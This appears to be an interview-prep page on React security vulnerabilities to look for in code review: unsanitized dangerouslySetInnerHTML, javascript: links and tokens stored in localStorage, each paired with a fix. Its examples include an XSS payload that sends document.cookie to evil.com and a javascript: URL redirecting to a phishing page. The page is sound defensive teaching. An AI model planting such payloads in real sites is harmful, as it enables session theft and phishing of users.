# What React-specific security vulnerabilities do you look for in code reviews?

> **Interview priority:** GOOD TO KNOW

## Question

What React-specific security vulnerabilities do you look for in code reviews?

## Beginner Lens

Before memorizing the interview answer, follow the scenario and notice three things: the problem React is solving, the state or browser work that changes, and the rule that keeps the UI correct. Read the code blocks slowly and predict the next result before reading the explanation.

## Detailed Explanation

**HOW TO SAY IT:**

> "React handles most XSS by default — JSX escapes everything rendered as text.
> The vulnerabilities I watch for are the places where you explicitly opt out
> of that protection. In a CMS or blog platform where users write rich content,
> these come up constantly. Let me go through each attack surface..."

```
REAL APP: CMS Blog Platform — Security Review Checklist

  VULNERABILITY 1: dangerouslySetInnerHTML without sanitization
  ─────────────────────────────────────────────────────────────
  // Editor saves rich text as HTML, we render it:

  // VULNERABLE:
  <div dangerouslySetInnerHTML={{ __html: post.content }} />

  // ATTACK: Malicious editor saves:
  post.content = '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'
                  +document.cookie)">'
  // When rendered: browser loads the img, it fails, executes onerror
  // Attacker receives: session cookie, auth token, everything

  // FIX: DOMPurify sanitizes before render
  import DOMPurify from 'dompurify';
  <div dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(post.content, {
      ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'ul', 'ol', 'li', 'a'],
      ALLOWED_ATTR: ['href', 'title'],
      FORCE_HTTPS: true,         // convert http:// links to https://
    })
  }} />

  ──────────────────────────────────────────────────────────────

  VULNERABILITY 2: href injection (javascript: protocol)
  ──────────────────────────────────────────────────────
  // User profiles have a website link field:
  // VULNERABLE:
  <a href={user.website}>Visit website</a>

  // ATTACK: User sets website = 'javascript:document.location="https://evil.com/phish"'
  // User clicks "Visit website" → gets phished

  // FIX:
  function SafeLink({ href, children }) {
    const isSafe = /^https?:\/\//i.test(href);
    return (
      <a
        href={isSafe ? href : '#'}
        rel="noopener noreferrer"   // prevent opener access
        target="_blank"
      >
        {children}
      </a>
    );
  }

  ──────────────────────────────────────────────────────────────

  VULNERABILITY 3: Auth token storage
  ─────────────────────────────────────
  // VULNERABLE: localStorage accessible by any JS on the page
  localStorage.setItem('refreshToken', token);
  // If any dependency has XSS → attacker reads token → full account access

  // FIX: HTTP-only cookie (set by server)
  // Server sets: Set-Cookie: refreshToken=xyz; HttpOnly; Secure; SameSite=Strict
  // JavaScript literally cannot read HttpOnly cookies
  // XSS attack cannot steal what JS can't read
```

---
